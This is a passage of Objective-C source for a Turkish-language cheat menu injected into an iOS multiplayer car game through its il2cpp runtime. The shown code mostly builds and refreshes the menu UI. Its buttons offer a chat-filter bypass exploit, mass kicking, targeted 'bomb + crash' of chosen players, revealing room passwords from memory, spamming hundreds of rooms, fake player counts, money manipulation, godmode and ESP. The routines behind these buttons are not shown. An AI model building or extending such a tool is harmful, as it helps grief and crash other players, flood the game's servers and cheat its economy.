        [ab setTitle:[NSString stringWithFormat:@"\U0001F3AC Animasyon Sec (%d/%d)", asciiAnimIndex + 1, (int)asciiAnims().count] forState:UIControlStateNormal];
        [ab setTitleColor:C_ACCENT forState:UIControlStateNormal];
        ab.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
        [ab addTarget:self action:@selector(pickAsciiAnim:) forControlEvents:UIControlEventTouchUpInside];
        [arow addSubview:ab];
        [self.contentView addSubview:arow];
        y += 52;
    }
    y = [self toggle:@"\U0001F308  ASCII Renk Dongusu" sub:@"Her kareyi farkli renkte gonder" key:@"asciicolor" atY:y action:@selector(tapAsciiColor)];
    y = [self actionRow:@"🧪  Exploit Test (Chat Filtresi Atlat)" color:C_RED atY:y action:@selector(exploitChatTest)];
    y = [self actionRow:@"🌈  TUM Oda Chatini Renklendir (secili renk)" color:C_ON atY:y action:@selector(colorAllChat)];
    // YENI: GIF -> ASCII (cihaz uzerinde cevirir, harici API yok)
    {
        UIView *grow = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,44)];
        grow.backgroundColor = C_CARD; grow.layer.cornerRadius = 12;
        UIButton *gb = [UIButton buttonWithType:UIButtonTypeSystem];
        gb.frame = CGRectMake(0,0,pw-24,44);
        NSString *snm = (g_gifCols<=16)?@"Kucuk (16)":(g_gifCols<=24)?@"Orta (24)":(g_gifCols<=32)?@"Buyuk (32)":@"Dev (40)";
        [gb setTitle:[NSString stringWithFormat:@"\U0001F4D0 GIF ASCII Olcu: %@", snm] forState:UIControlStateNormal];
        [gb setTitleColor:C_ACCENT forState:UIControlStateNormal];
        gb.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
        [gb addTarget:self action:@selector(pickGifSize:) forControlEvents:UIControlEventTouchUpInside];
        [grow addSubview:gb];
        [self.contentView addSubview:grow];
        y += 52;
    }
    y = [self actionRow:@"📂  GIF/Resim Yukle → ASCII'ye Cevir" color:C_ON atY:y action:@selector(pickGifForAscii)];
    y = [self actionRow:@"▶️  GIF'i Chatte Oynat (baslat/durdur)" color:C_ACCENT atY:y action:@selector(playGifAscii)];
    y = [self toggle:@"🌈  GIF Renkli Oynat" sub:@"Kapali=renksiz ASCII, Acik=gokkusagi" key:@"gifColored" atY:y action:@selector(tapGifColored)];
    // YENI: Hacker Chat Modlari
    y = [self toggle:@"🟢  Matrix Chat Modu" sub:@"Mesajlarin yesil sistem stili" key:@"matrixchat" atY:y action:@selector(tapMatrixChat)];
    y = [self toggle:@"💀  Glitch Chat Modu" sub:@"Mesajlarin mor/root stili" key:@"glitchchat" atY:y action:@selector(tapGlitchChat)];
    // YENI: mod'dan yaz -> stilde gonder (hook gerektirmez, her zaman calisir)
    y = [self actionRow:@"🟢  Matrix Mesaji Gonder (yaz→stil)" color:C_ON atY:y action:@selector(sendMatrixMsg)];
    y = [self actionRow:@"💀  Glitch Mesaji Gonder (yaz→stil)" color:C_ON atY:y action:@selector(sendGlitchMsg)];
    y = [self actionRow:@"🌧  Emoji Yagmuru (oyun sprite'lari)" color:C_ACCENT atY:y action:@selector(emojiRain)];
    y = [self actionRow:@"🧪  Emoji Test (0-29 hangisi gecerli?)" color:C_CYAN atY:y action:@selector(emojiSpriteTest)];
    y = [self toggle:@"👋  Otomatik Karsilama" sub:@"Odaya girince otomatik mesaj at" key:@"autogreet" atY:y action:@selector(tapAutoGreet)];
    y = [self actionRow:@"✏️  Karsilama Mesajini Duzenle" color:C_CYAN atY:y action:@selector(editGreet)];
    y = [self actionRow:@"📋  Hacker Chat Sablonu Gonder" color:C_RED atY:y action:@selector(sendChatTemplate)];

    y = [self header:@"\U0001F3B5  SARKI SOZU (altyazi)" atY:y];
    y = [self actionRow:@"\U0001F50D  Sarki Ara (internetten getir)" color:C_ON atY:y action:@selector(fetchLyricsByName)];
    y = [self toggle:@"▶️  Sarki Sozunu Baslat" sub:@"Her satiri sirayla chate yazar" key:@"lyrics" atY:y action:@selector(tapLyrics)];
    y = [self actionRow:@"✏️  Elle Sarki Sozu Gir (cok satir)" color:C_CYAN atY:y action:@selector(editLyrics)];
    y = [self actionRow:@"⏱️  Satir Araligi Ayarla" color:C_CYAN atY:y action:@selector(editLyricsInterval)];
    y = [self toggle:@"\U0001F308  Renkli Satirlar" sub:@"Her satir farkli renk" key:@"lyricsColor" atY:y action:@selector(tapLyricsColor)];
    y = [self toggle:@"\U0001F501  Bitince Basa Sar" sub:@"Sarki sozunu tekrarla" key:@"lyricsLoop" atY:y action:@selector(tapLyricsLoop)];


    y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
    self.nameBtn = [self actionButtonRow:&y];
    [self.nameBtn setTitle:@"\U0001F4DB  Isim Degistir" forState:UIControlStateNormal];
    [self.nameBtn setTitleColor:C_CYAN forState:UIControlStateNormal];
    [self.nameBtn addTarget:self action:@selector(changeName) forControlEvents:UIControlEventTouchUpInside];
    y = [self actionRow:@"\U0001F3AD  Isim Hileleri (rozet/gorunmez/kayan)" color:C_GOLD atY:y action:@selector(nameTricks)];

    y = [self header:@"\U0001F511  ODA" atY:y];
    y = [self actionRow:@"🚪  Canlı Odalara Gir (Dolu Oda Bypass & Liste)" color:C_ON atY:y action:@selector(joinRoomByName)];
    y = [self actionRow:@"🌐  TOPLU SUNUCU GİZLE (gir→master→gizle→çık)" color:C_RED atY:y action:@selector(pickRoomsServerHide)];
    y = [self actionRow:@"🏡  Gelişmiş Özel Oda Kur (Çöl, Saat, Drift, 31 Kişi)" color:C_ON atY:y action:@selector(createAdvancedCustomRoom)];
    y = [self actionRow:@"🏠  Normal Oda Kur (isim yaz — deneysel)" color:C_ON atY:y action:@selector(createNormalRoom)];
    y = [self actionRow:@"📈  Bu Odayı Büyüt (önce normal oda kur→gir→bas)" color:C_ON atY:y action:@selector(setRoomMax)];
    y = [self actionRow:@"🔒  Odayı Kilitle/Aç (IsOpen)" color:C_ON atY:y action:@selector(tapRoomLock)];
    y = [self actionRow:@"👻  Görünmez/Görünür (IsVisible)" color:C_ON atY:y action:@selector(tapRoomHide)];
    y = [self actionRow:@"🔑  Oda Şifresi Belirle" color:C_ON atY:y action:@selector(tapRoomPassword)];
    {
        UIView *rmrow = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,44)];
        rmrow.backgroundColor = C_CARD; rmrow.layer.cornerRadius = 12;
        UIButton *rmb = [UIButton buttonWithType:UIButtonTypeSystem];
        rmb.frame = CGRectMake(0,0,pw-24,44);
        [rmb setTitle:[NSString stringWithFormat:@"\U0001F465 Oda Max Oyuncu: %d", roomMaxPlayers] forState:UIControlStateNormal];
        [rmb setTitleColor:C_ACCENT forState:UIControlStateNormal];
        rmb.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
        [rmb addTarget:self action:@selector(pickRoomMax:) forControlEvents:UIControlEventTouchUpInside];
        [rmrow addSubview:rmb];
        [self.contentView addSubview:rmrow];
        y += 52;
    }
    y = [self actionRow:@"\U0001F513  Oda Sifrelerini Goster (il2cpp)" color:C_ON atY:y action:@selector(showRoomPasswords)];
    y = [self actionRow:@"\U0001F465  Odadaki Oyuncular (isim kopyala)" color:C_CYAN atY:y action:@selector(showPlayers)];
    y = [self actionRow:@"\U0001F441  Odaya Goz At (isimsiz anlik gir-cik)" color:C_GOLD atY:y action:@selector(peekRoom)];
    y = [self actionRow:@"👑  Oda Master Ol" color:C_GOLD atY:y action:@selector(tapRoomMaster)];
    y = [self actionRow:[NSString stringWithFormat:@"⚙️  Master Claim %@ (v70 modu)", isMasterClaimDisabled ? @"KAPALI ✅" : @"ACIK ⚠️"] color:C_CYAN atY:y action:@selector(toggleMasterClaim)];
    y = [self toggle:@"🤖  Otomatik Master" sub:@"Master gidince aninda geri al" key:@"automaster" atY:y action:@selector(tapAutoMaster)];
    y = [self actionRow:@"⏱️  Oyun Hızı (TimeScale)" color:C_CYAN atY:y action:@selector(tapGameSpeed)];
    y = [self actionRow:@"👥  Fake Çevrimici Sayısı (Lobi Görseli)" color:C_CYAN atY:y action:@selector(tapFakeOnline)];
    y = [self actionRow:@"🗺️  Odadayken Harita Değiştir (v233 minimal + master zorla)" color:C_ON atY:y action:@selector(changeMapInRoom)];
    y = [self actionRow:@"🚗  Kişi Aracı Klonla (deneysel race glitch)" color:C_GOLD atY:y action:@selector(cloneCarPicker)];
    y = [self actionRow:@"🌤️  Hava Durumu & Zaman Seç (Aktarmasız Canlı)" color:C_ON atY:y action:@selector(changeWeatherOnly)];
    // Oda ismi degistirmek icin tek gercek yol: 🔄 Odayi Yeniden Olustur (asagida)
    y = [self actionRow:@"👥  Odadayken Max Oyuncu Değiştir (2-100)" color:C_GOLD atY:y action:@selector(changeMaxPlayersInRoom)];
    y = [self actionRow:@"🔄  Odayı YENİDEN OLUŞTUR (herkeste değişir)" color:C_RED atY:y action:@selector(recreateRoomWithNewName)];
    y = [self actionRow:@"🏷️  Harita Metnini Değiştir (Kişi Sayısı Yanı - ADMIN vb.)" color:C_GOLD atY:y action:@selector(changeCustomMapLabel)];
    y = [self actionRow:@"🔒  Odayı Kilitle / Aç (IsOpen Toggle)" color:C_GOLD atY:y action:@selector(tapRoomLock)];
    y = [self actionRow:@"👁️  Odayı Gizle / Göster (IsVisible Toggle)" color:C_GOLD atY:y action:@selector(tapRoomHide)];
    y = [self actionRow:@"\U0001F511  Oda Sifresi Koy / Kaldir" color:C_GOLD atY:y action:@selector(tapRoomPassword)];
    y = [self actionRow:@"\U0001F4A5  ODAYI KAPAT (Herkesi At & Odayi Sonlandir)" color:C_RED atY:y action:@selector(nukeRoom)];
    y = [self actionRow:@"💥  Odadaki Herkesi At (Mass Kick)" color:C_RED atY:y action:@selector(tapRoomKickAll)];
    y = [self actionRow:@"🎯  Belirli Oyuncuyu At (Sec ve Kick)" color:C_RED atY:y action:@selector(nativeKickPick)];
    y = [self actionRow:@"💣  HEDEFLİ BOMBA + CRASH (Sec)" color:C_RED atY:y action:@selector(targetBombCrashPick)];
    y = [self actionRow:@"🆔  Oyuncu ID Listesi (ActorNumber + UserId)" color:C_ON atY:y action:@selector(showPlayerIDs)];
    y = [self toggle:@"🕵️  İsim Değişikliği Takibi (Auto)" sub:@"ActorNumber -> NickName eşleşmesini izler, değişirse alert" key:@"nametrack" atY:y action:@selector(tapNameTrack)];
    y = [self actionRow:@"✏️  Nickname ile At (Elle yaz)" color:C_GOLD atY:y action:@selector(nativeKickByName)];
    y = [self actionRow:@"💣  Oda Patlatma (Odadakileri Düşür)" color:C_RED atY:y action:@selector(tapRoomExplode)];
    y = [self actionRow:@"🎨  Odadaki Araç Rengini Değiştir (Tüm Araçları Boya)" color:C_GOLD atY:y action:@selector(pickCarPaintColor)];
    y = [self actionRow:@"🎨  Renkli Oda Kur (Dinamik Stil Paneli)" color:C_GOLD atY:y action:@selector(createColoredRoom)];
    y = [self actionRow:@"🧪  Exploit Ile Oda Kur (30 Yontem)" color:C_RED atY:y action:@selector(exploitCreateRoom)];
    y = [self actionRow:@"🏠  Düz Özel İsimli Oda Kur" color:C_CYAN atY:y action:@selector(createOneRoom)];
    y = [self actionRow:@"\U0001F4A5  300 ODA AC (tek tus, 0.02sn)" color:C_RED atY:y action:@selector(spam300Rooms)];
    y = [self toggle:@"\U0001F4E5  Fake Oda Spam" sub:@"Kalici odalar birikir" key:@"roomspam" atY:y action:@selector(tapRoomSpam)];
    y = [self toggle:@"\U0001F504  Surekli Mod" sub:@"Kapatana kadar spam" key:@"roomcont" atY:y action:@selector(tapRoomContinuous)];
    y = [self actionRow:@"✏️  Oda Ismini Ayarla" color:C_CYAN atY:y action:@selector(editRoomName)];
    y = [self actionRow:@"\U0001F4CA  Oda Sayisi (0=sinirsiz)" color:C_CYAN atY:y action:@selector(editRoomSpamCount)];
    y = [self actionRow:@"⏱️  Oda Acik Kalma Suresi" color:C_CYAN atY:y action:@selector(editRoomTTL)];
    y = [self actionRow:@"⏰  Spam Araligi" color:C_CYAN atY:y action:@selector(editRoomSpamInterval)];

    y = [self header:@"\U0001F4B5  PARA (gecici - server kilitli)" atY:y];
    y = [self toggle:@"\U0001F4B0  Yaris Odulunu Buyut" sub:@"Kazandikca sunucuya yazmayi dener" key:@"automoney" atY:y action:@selector(tapAutoMoney)];
    self.moneyBtn = [self actionButtonRow:&y];
    [self.moneyBtn addTarget:self action:@selector(addMoneyTap) forControlEvents:UIControlEventTouchUpInside];
    y = [self actionRow:@"✏️  Para Miktarini Ayarla" color:C_CYAN atY:y action:@selector(editMoneyAmount)];
    y = [self actionRow:@"🎯  Tum Daily Task'leri Tamamla (Claim'e sen bas)" color:C_GOLD atY:y action:@selector(completeAllDailyTasks)];

    UIView *sc = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,38)];
    UILabel *sl = [[UILabel alloc] initWithFrame:CGRectMake(0,0,pw-24,38)];
    sc.layer.cornerRadius = 11;
    sc.layer.borderWidth = 1.0;
    if (global_base != 0 && g_il2cppReady) {
        sc.backgroundColor = [UIColor colorWithRed:0.0 green:0.55 blue:0.85 alpha:0.10];
        sc.layer.borderColor = [UIColor colorWithRed:0.0 green:0.55 blue:0.85 alpha:0.35].CGColor;
        sl.text = g_rb ? @"\U0001F7E2 il2cpp OK  •  Araba bagli" : @"\U0001F7E1 il2cpp OK  •  Araba araniyor...";
        sl.textColor = C_ON;
    } else {
        sc.backgroundColor = [UIColor colorWithRed:0.90 green:0.20 blue:0.35 alpha:0.10];
        sc.layer.borderColor = [UIColor colorWithRed:0.90 green:0.20 blue:0.35 alpha:0.35].CGColor;
        sl.text = @"\U0001F534 Framework/il2cpp bekleniyor";
        sl.textColor = C_RED;
    }
    self.statusLabel = sl; self.statusCard = sc;
    sl.textAlignment = NSTextAlignmentCenter;
    sl.font = [UIFont systemFontOfSize:11 weight:UIFontWeightBold];
    [sc addSubview:sl];
    [self.contentView addSubview:sc];
    y += 46;

    y = [self actionRow:@"\U0001F504  Modu Yeniden Baslat (araba bulunamazsa)" color:C_ON atY:y action:@selector(restartMod)];
    y = [self actionRow:@"\U0001F4CB  Loglari Goster (hata teshisi)" color:C_CYAN atY:y action:@selector(showLog)];

    UILabel *foot = [[UILabel alloc] initWithFrame:CGRectMake(0,y+4,pw,24)];
    foot.text = @"made by few1n  •  il2cpp engine";
    foot.textColor = [UIColor colorWithRed:0.45 green:0.55 blue:0.65 alpha:1.0];
    foot.textAlignment = NSTextAlignmentCenter;
    foot.font = [UIFont systemFontOfSize:10 weight:UIFontWeightMedium];
    [self.contentView addSubview:foot];
    y += 36;

    self.contentView.frame = CGRectMake(0,0,pw,y);
    self.scrollView.contentSize = CGSizeMake(pw,y);
    for (int i = 0; i < 24; i++) g_secOpen[i] = false;  // TUM BOLUMLER VARSAYILAN KAPALI (tiklayinca acilir)
    [self reflowMenu];     // ACCORDION: bolumleri katla/ac
    [w addSubview:self.panel];
    [self refreshUI];

    if (tickTimer) { [tickTimer invalidate]; tickTimer = nil; }
    tickTimer = [NSTimer scheduledTimerWithTimeInterval:0.3 target:self selector:@selector(tick) userInfo:nil repeats:YES];
    // iGameGod gibi: timeScale'i HER FRAME zorla (oyun resetlese bile tutar)
    if (self.dl) { [self.dl invalidate]; self.dl = nil; }
    self.dl = [CADisplayLink displayLinkWithTarget:self selector:@selector(frameTick)];
    [self.dl addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes];
    if (isSpamEnabled && !spamTimer)
        spamTimer = [NSTimer scheduledTimerWithTimeInterval:0.05 target:self selector:@selector(fireSpam) userInfo:nil repeats:YES];
    if (isAsciiAnimEnabled && !asciiTimer)
        asciiTimer = [NSTimer scheduledTimerWithTimeInterval:0.4 target:self selector:@selector(fireAscii) userInfo:nil repeats:YES];
}

- (CGFloat)header:(NSString*)text atY:(CGFloat)y {
    CGFloat pw = self.panel.bounds.size.width;
    g_secBuildIdx++;
    int sec = g_secBuildIdx;
    // Tek KONTEYNER: tiklanabilir katlanir baslik (tag=5000+bolum)
    UIView *hc = [[UIView alloc] initWithFrame:CGRectMake(0, y, pw, 30)];
    hc.tag = 5000 + sec;
    UIView *bar = [[UIView alloc] initWithFrame:CGRectMake(12, 2, 4, 16)];
    bar.backgroundColor = C_CYAN; bar.layer.cornerRadius = 2;
    bar.layer.shadowColor = C_CYAN.CGColor; bar.layer.shadowRadius = 4;
    bar.layer.shadowOpacity = 0.8; bar.layer.shadowOffset = CGSizeMake(0,0);
    [hc addSubview:bar];
    UILabel *l = [[UILabel alloc] initWithFrame:CGRectMake(24,0,pw-70,20)];
    l.text = [text uppercaseString]; l.textColor = C_TEXT;
    l.font = [UIFont systemFontOfSize:11 weight:UIFontWeightBlack];
    [hc addSubview:l];
    // katlanma oku (tag=88 -> reflow'da yon guncellenir)
    UILabel *arrow = [[UILabel alloc] initWithFrame:CGRectMake(pw-38,0,22,20)];
    arrow.tag = 88; arrow.text = @"▸"; arrow.textColor = C_ACCENT;
    arrow.font = [UIFont systemFontOfSize:12 weight:UIFontWeightBold];
    arrow.textAlignment = NSTextAlignmentCenter;
    [hc addSubview:arrow];
    UIView *line = [[UIView alloc] initWithFrame:CGRectMake(12, 22, pw-24, 1)];
    CAGradientLayer *lg = [CAGradientLayer layer];
    lg.frame = CGRectMake(0,0,pw-24,1);
    lg.colors = @[(id)C_CYAN.CGColor, (id)[UIColor clearColor].CGColor];
    lg.startPoint = CGPointMake(0,0.5); lg.endPoint = CGPointMake(1,0.5);
    [line.layer addSublayer:lg];
    [hc addSubview:line];
    UIButton *tap = [UIButton buttonWithType:UIButtonTypeCustom];
    tap.frame = hc.bounds; tap.tag = sec;
    [tap addTarget:self action:@selector(toggleSection:) forControlEvents:UIControlEventTouchUpInside];
    [hc addSubview:tap];
    [self.contentView addSubview:hc];
    return y + 30;
}
// KATLANMA: basliga basinca o bolumu ac/kapat + yeniden diz
- (void)toggleSection:(UIButton*)b {
    int sec = (int)b.tag;
    if (sec >= 0 && sec < 24) g_secOpen[sec] = !g_secOpen[sec];
    [self reflowMenu];
}
// KONUM-TABANLI YENIDEN DIZ: her baslik gorunur; altindaki satirlar bolum acıksa gorunur.
- (void)reflowMenu {
    CGFloat yy = 12; int curSec = -1;
    for (UIView *v in self.contentView.subviews) {
        NSInteger tg = v.tag;
        if (tg >= 5000 && tg < 6000) {          // BASLIK: her zaman gorunur
            curSec = (int)(tg - 5000);
            CGRect f = v.frame; f.origin.y = yy; v.frame = f; v.hidden = NO;
            UILabel *ar = (UILabel*)[v viewWithTag:88];
            if (ar) ar.text = (curSec>=0 && curSec<24 && g_secOpen[curSec]) ? @"▾" : @"▸";
            yy += 30;
            continue;
        }
        // SATIR: mevcut bolume ait -> bolum acıksa goster
        BOOL vis = (curSec < 0) || (curSec < 24 && g_secOpen[curSec]);
        if (vis) {
            CGRect f = v.frame; f.origin.y = yy; v.frame = f; v.hidden = NO;
            NSNumber *adv = objc_getAssociatedObject(v, "adv");   // gercek ilerleme (kayma yok)
            yy += adv ? [adv floatValue] : (v.frame.size.height + 8.0);
        } else {
            v.hidden = YES;
        }
    }
    CGFloat pw = self.panel.bounds.size.width;
    self.contentView.frame = CGRectMake(0,0,pw,yy+12);
    self.scrollView.contentSize = CGSizeMake(pw, yy+12);
}

- (CGFloat)toggle:(NSString*)tl sub:(NSString*)sub key:(NSString*)key atY:(CGFloat)y action:(SEL)action {
    CGFloat pw = self.panel.bounds.size.width;
    UIView *card = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,56)];
    card.backgroundColor = [UIColor colorWithRed:0.97 green:0.985 blue:1.0 alpha:1.0];
    card.layer.cornerRadius = 14;
    card.layer.borderWidth = 1.0;
    card.layer.borderColor = [UIColor colorWithRed:0.0 green:0.48 blue:0.85 alpha:0.14].CGColor;
    card.layer.shadowColor = [UIColor colorWithRed:0.0 green:0.35 blue:0.65 alpha:1.0].CGColor;
    card.layer.shadowRadius = 5; card.layer.shadowOpacity = 0.10;
    card.layer.shadowOffset = CGSizeMake(0,2);
    UILabel *t = [[UILabel alloc] initWithFrame:CGRectMake(16,8,pw-100,22)];
    t.text = tl; t.textColor = C_TEXT;
    t.font = [UIFont systemFontOfSize:14 weight:UIFontWeightSemibold];
    [card addSubview:t];
    UILabel *s = [[UILabel alloc] initWithFrame:CGRectMake(16,30,pw-100,16)];
    s.text = sub; s.textColor = C_SUB;
    s.font = [UIFont systemFontOfSize:10 weight:UIFontWeightMedium];
    [card addSubview:s];
    UIView *pill = [[UIView alloc] initWithFrame:CGRectMake(pw-24-60,15,44,24)];
    pill.backgroundColor = C_OFF; pill.layer.cornerRadius = 12;
    UIView *dot = [[UIView alloc] initWithFrame:CGRectMake(2,2,20,20)];
    dot.backgroundColor = [UIColor whiteColor]; dot.layer.cornerRadius = 10; dot.tag = 101;
    [pill addSubview:dot];
    [card addSubview:pill];
    UIButton *tap = [UIButton buttonWithType:UIButtonTypeCustom];
    tap.frame = card.bounds;
    [tap addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    [card addSubview:tap];
    [self.contentView addSubview:card];
    objc_setAssociatedObject(card, "adv", @(64.0), OBJC_ASSOCIATION_RETAIN);
    self.toggleViews[key] = pill;
    return y + 64;
}

- (CGFloat)actionRow:(NSString*)text color:(UIColor*)color atY:(CGFloat)y action:(SEL)action {
    CGFloat pw = self.panel.bounds.size.width;
    UIView *row = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,44)];
    row.backgroundColor = [UIColor colorWithRed:0.97 green:0.985 blue:1.0 alpha:1.0];
    row.layer.cornerRadius = 12;
    row.layer.borderWidth = 1.0;
    row.layer.borderColor = [UIColor colorWithRed:0.0 green:0.48 blue:0.85 alpha:0.12].CGColor;
    row.layer.shadowColor = [UIColor colorWithRed:0.0 green:0.35 blue:0.65 alpha:1.0].CGColor;
    row.layer.shadowRadius = 4; row.layer.shadowOpacity = 0.08;
    row.layer.shadowOffset = CGSizeMake(0,2);
    UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
    b.frame = CGRectMake(0,0,pw-24,44);
    [b setTitle:text forState:UIControlStateNormal];
    [b setTitleColor:color forState:UIControlStateNormal];
    b.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
    [b addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    [row addSubview:b];
    [self.contentView addSubview:row];
    objc_setAssociatedObject(row, "adv", @(52.0), OBJC_ASSOCIATION_RETAIN);
    return y + 52;
}

- (UIButton*)actionButtonRow:(CGFloat*)y {
    CGFloat pw = self.panel.bounds.size.width;
    UIView *card = [[UIView alloc] initWithFrame:CGRectMake(12,*y,pw-24,48)];
    card.backgroundColor = C_CARD; card.layer.cornerRadius = 12;
    UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
    b.frame = CGRectMake(0,0,pw-24,48);
    [b setTitleColor:C_GOLD forState:UIControlStateNormal];
    b.titleLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightBold];
    [card addSubview:b];
    [self.contentView addSubview:card];
    objc_setAssociatedObject(card, "adv", @(60.0), OBJC_ASSOCIATION_RETAIN);
    *y += 60;
    return b;
}

- (void)setToggle:(NSString*)key on:(BOOL)on {
    UIView *pill = self.toggleViews[key];
    if (!pill) return;
    UIView *dot = [pill viewWithTag:101];
    if (!dot) return;
    [UIView animateWithDuration:0.3 delay:0 usingSpringWithDamping:0.6 initialSpringVelocity:0.5 options:0 animations:^{
        pill.backgroundColor = on ? C_ON : C_OFF;
        dot.frame = on ? CGRectMake(22,2,20,20) : CGRectMake(2,2,20,20);
        pill.layer.shadowColor = C_ON.CGColor;
        pill.layer.shadowOffset = CGSizeMake(0,0);
        pill.layer.shadowRadius = on ? 8 : 0;
        pill.layer.shadowOpacity = on ? 0.7 : 0.0;
    } completion:nil];
}

- (NSString*)shortNum:(long)n {
    if (n >= 1000000000) return [NSString stringWithFormat:@"%.1fB", n/1000000000.0];
    if (n >= 1000000)    return [NSString stringWithFormat:@"%ldM", n/1000000];
    if (n >= 1000)       return [NSString stringWithFormat:@"%ldK", n/1000];
    return [NSString stringWithFormat:@"%ld", n];
}

- (void)refreshUI {
    // v93 KESIN FIX: bir UIAlertController veya keyboard aktifken refreshUI ATLA.
    // Yoksa 0.02s roomSpam / 0.3s tickTimer subview'lari destroy edip TextField'i
    // FirstResponder'dan kopariyor -> yazamama + dokunmatik bug. Bu bug sporadikti,
    // suanki Balata rollback'inden BAGIMSIZ ve ONCEDEN de vardi.
    @try {
        UIWindow *kw = nil;
        if (@available(iOS 13.0, *)) {
            for (UIScene *sc in [UIApplication sharedApplication].connectedScenes) {
                if ([sc isKindOfClass:[UIWindowScene class]]) {
                    for (UIWindow *w in ((UIWindowScene*)sc).windows) { if (w.isKeyWindow) { kw = w; break; } }
                }
                if (kw) break;
            }
        }
        if (!kw) kw = [UIApplication sharedApplication].keyWindow;
        UIViewController *root = kw.rootViewController;
        UIViewController *pres = root;
        while (pres.presentedViewController) pres = pres.presentedViewController;
        if ([pres isKindOfClass:[UIAlertController class]]) {
            // Bir alert (textfield dahil) acik - refreshUI'yi ATLA, TextField focus kaybini onle
            return;
        }
    } @catch (...) {}
    for (NSNumber *v in self.speedBtns) {
        UIButton *b = self.speedBtns[v];
        BOOL on = (speedMode == v.intValue);
        b.backgroundColor = on ? C_ON : [UIColor colorWithRed:0.88 green:0.93 blue:0.98 alpha:1.0];
        [b setTitleColor:on ? [UIColor whiteColor] : C_TEXT forState:UIControlStateNormal];
        b.layer.shadowColor = C_ON.CGColor;
        b.layer.shadowOffset = CGSizeMake(0,2);
        b.layer.shadowRadius = on ? 6 : 0;
        b.layer.shadowOpacity = on ? 0.45 : 0.0;
    }
    [self setToggle:@"fly"       on:isFlyEnabled];
    [self setToggle:@"flyauto"   on:flyAutoThrust];
    [self setToggle:@"flypad"    on:isFlyPadShown];
    [self setToggle:@"lowgrav"   on:isLowGravEnabled];
    [self setToggle:@"chatspam"  on:isSpamEnabled];
    [self setToggle:@"asciianim" on:isAsciiAnimEnabled];
    [self setToggle:@"gifColored" on:g_gifColored];
    [self setToggle:@"autogreet" on:isAutoGreetEnabled];
    [self setToggle:@"bypass"    on:isBypassPasswordEnabled];
    [self setToggle:@"roomspam"  on:isRoomSpamEnabled];
    [self setToggle:@"roomcont"  on:roomSpamContinuous];
    [self setToggle:@"automoney" on:isAutoMoneyEnabled];
    [self setToggle:@"esp"       on:isEspEnabled];
    [self setToggle:@"asciicolor" on:asciiColorCycle];
    [self setToggle:@"noclip"    on:isNoClip];
    [self setToggle:@"godmode"   on:isGodmode];
    [self setToggle:@"selektor"  on:isSelektor];
    [self setToggle:@"antigrav"  on:isAntiGrav];
    [self setToggle:@"matrixchat" on:isMatrixChatEnabled];
    [self setToggle:@"glitchchat" on:isGlitchChatEnabled];
    [self setToggle:@"carsize"   on:isCarSizeEnabled];
    [self setToggle:@"carcolor"  on:isCarColorEnabled];
    [self setToggle:@"carcolorrainbow" on:carColorRainbow];
    [self setToggle:@"drift"     on:isDriftEnabled];
    [self setToggle:@"cruise"    on:isCruiseEnabled];
    [self setToggle:@"lyrics"    on:isLyricsEnabled];
    [self setToggle:@"lyricsColor" on:lyricsColorCycle];
    [self setToggle:@"lyricsLoop" on:lyricsLoop];
    [self setToggle:@"nancrash" on:isNanCrashEnabled];
    [self setToggle:@"adblock" on:isAdBlockEnabled];
    [self setToggle:@"popbangs" on:isPopBangsEnabled];
    [self setToggle:@"autohorn" on:isAutoHornEnabled];
    [self setToggle:@"revlimiter" on:isRevLimiterEnabled];
    // v95 FIX: 4 buton EKSIK KALDI refreshUI'da — basınca iç state değişiyordu ama pill güncellenmiyordu
    // Kullanıcı "açılmıyor" sanıyordu. Şimdi eklendi.
    [self setToggle:@"automaster"     on:isAutoMasterEnabled];
    [self setToggle:@"brakeglow"      on:isBrakeGlowEnabled];  // eski favori anahtari
    [self setToggle:@"brakeglowdob"   on:isBrakeGlowDobEnabled];
    [self setToggle:@"brakeglowmin"   on:isBrakeGlowMinTempEnabled];
    [self setToggle:@"nodamage"       on:isNoDamageEnabled];
    [self setToggle:@"colorroomforce" on:isColorRoomForce];
    [self setToggle:@"alwayslights"   on:isAlwaysLightsEnabled];
    // v100 gizli ozellik pill'leri
    [self setToggle:@"infnos"         on:isInfiniteNosEnabled];
    [self setToggle:@"inffuel"        on:isInfiniteFuelEnabled];
    [self setToggle:@"maxrpm"         on:isMaxRpmEnabled];
    [self setToggle:@"nodamagev2"     on:isNoDamageV2Enabled];
    [self setToggle:@"immortalengine" on:isEngineImmortalEnabled];
    [self setToggle:@"notraffic"      on:isNoTrafficEnabled];
    [self setToggle:@"emissive"       on:isEmissivePaintEnabled];
    [self setToggle:@"exhaustflame"   on:isExhaustFlameOnEnabled];
    [self setToggle:@"vidyonames"     on:isVidyoNamesEnabled];
    [self setToggle:@"nametrack"      on:isNameTrackEnabled];
    [self setToggle:@"aichat"         on:isAiChatModeEnabled];

    // canli durum rozeti
    if (self.statusLabel && self.statusCard) {
        if (global_base != 0 && g_il2cppReady) {
            self.statusCard.backgroundColor = [UIColor colorWithRed:0.0 green:0.55 blue:0.85 alpha:0.10];
            self.statusCard.layer.borderColor = [UIColor colorWithRed:0.0 green:0.55 blue:0.85 alpha:0.35].CGColor;
            self.statusLabel.text = g_rb ? @"\U0001F7E2 il2cpp OK  •  Araba bagli" : @"\U0001F7E1 il2cpp OK  •  Araba araniyor...";
            self.statusLabel.textColor = C_ON;
        }
    }

    long m = -1;
    if (playerManagerGetInst && pm_getMoney) {
        @try { void* pm = playerManagerGetInst(); if (pm) m = pm_getMoney(pm); } @catch (...) {}
    }
    if (m >= 0)
